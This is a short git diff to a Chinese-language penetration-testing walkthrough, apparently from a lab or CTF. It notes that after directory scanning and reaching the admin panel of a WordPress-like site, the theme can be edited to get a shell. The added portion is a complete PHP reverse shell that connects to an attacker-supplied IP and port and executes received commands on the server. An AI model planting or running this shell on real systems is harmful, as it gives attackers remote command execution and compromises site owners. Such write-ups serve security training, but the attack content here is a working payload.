@@ -174,4 +174,26 @@ dirsearch扫目录
 
 ![](attachments/Pasted%20image%2020230303180814.png)
 
-进后台之后是一个类Wordpress的网站，在Theme哪里去做修改拿shell
+进后台之后是一个类Wordpress的网站，在Theme哪里去做修改拿shell,下面是一个php的反弹shell
+
+```php
+<?php 
+set_time_limit(0); 
+$ip=$_POST['ip'];
+$port=$_POST['port'];
+$fp=@fsockopen($ip,$port,$errno,$errstr);
+if(!$fp){echo "error";}
+else{
+	fputs($fp,"\n+++++++++++++connect sucess+++++++++\n");
+	while(!feof($fp)){
+	fputs($fp,"shell:");
+	$shell=fgets($fp);
+	$message=`$shell`;
+	fputs($fp,$message);
+	}
+fclose($fp);
+}
+?>
+
+```
+
